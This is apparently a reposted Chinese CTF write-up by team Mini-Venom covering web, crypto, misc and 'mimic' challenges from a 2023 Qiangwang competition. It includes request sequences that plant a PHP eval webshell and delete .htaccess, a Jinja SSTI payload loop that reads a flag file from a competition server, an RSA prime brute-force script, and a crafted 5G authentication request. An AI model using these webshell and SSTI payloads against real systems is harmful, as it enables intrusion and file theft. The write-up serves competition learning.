# 第六届“强网”拟态防御国际精英挑战赛 WriteUp By Mini-Venom

> 原文: https://www.ctfiot.com/146224.html
> ID: 146224

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组

Web:

noumisotuitennnoka

可以看下这个

https://blog.tyage.net/archive/p944.html 利用remove_path的问题

创建
?action=create&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//
压缩
?action=zip&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//
解压
?action=unzip&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//
删除.htaccess
?action=clear&subdir=/.htaccess&content=<?php eval($_POST[1]);&dev=/tmp//
访问shell

Crypto:

一眼看出

爆破解rsa

from Crypto.Util.number import *
import gmpy2
n=121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313
c=42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267
a = 11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699

for r in range(0,2**6):

p = gmpy2.next_prime(a – r)

q = gmpy2.next_prime(gmpy2.next_prime(a) + r)

if(p*q==n):

d=gmpy2.invert(65537,(p-1)*(q-1))

m=pow(c,d,n)

print(long_to_bytes(m))

break

#flag{621f7c4f-21de-8566-649e-5a883ce318dc}

Misc:

国际象棋与二维码

生成500*500像素，行列为49格的棋盘图案
接着与attach.png异或得到二维码
扫描得到flag

Mimic:

用户登记系统

url = 'http://116.63.134.105/index.php'
for i in range(1000):
    paylaod = {'name':'{{c.__init__.__globals__.__builtins__.open("".join(c.__init__.__globals__["__builtins__"].reversed("galf/pmt/"))).read()['+str(i)+']}}'}
    response = requests.post(url,data=paylaod).text[8]
    print(response,end='')

用户鉴权

https://www.sharetechnote.com/html/5G/5G_Core_Authentication.html

POST /nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json

{

“servingNetworkName”: “admin”,

“ausfInstanceId”: “admin”

}

然后base64直接解密

– END –


```
创建
?action=create&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//
压缩
?action=zip&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//
解压
?action=unzip&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//
删除.htaccess
?action=clear&subdir=/.htaccess&content=<?php eval($_POST[1]);&dev=/tmp//
访问shell
```



```
from Crypto.Util.number import *
import gmpy2
n=121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313
c=42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267
a = 11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699
```



```
生成500*500像素，行列为49格的棋盘图案
接着与attach.png异或得到二维码
扫描得到flag
```



```
url = 'http://116.63.134.105/index.php'
for i in range(1000):
    paylaod = {'name':'{{c.__init__.__globals__.__builtins__.open("".join(c.__init__.__globals__["__builtins__"].reversed("galf/pmt/"))).read()['+str(i)+']}}'}
    response = requests.post(url,data=paylaod).text[8]
    print(response,end='')
```



```
POST /nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/9-1700213364.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/2-1700213365.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/8-1700213365.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/3-1700213366.jpeg)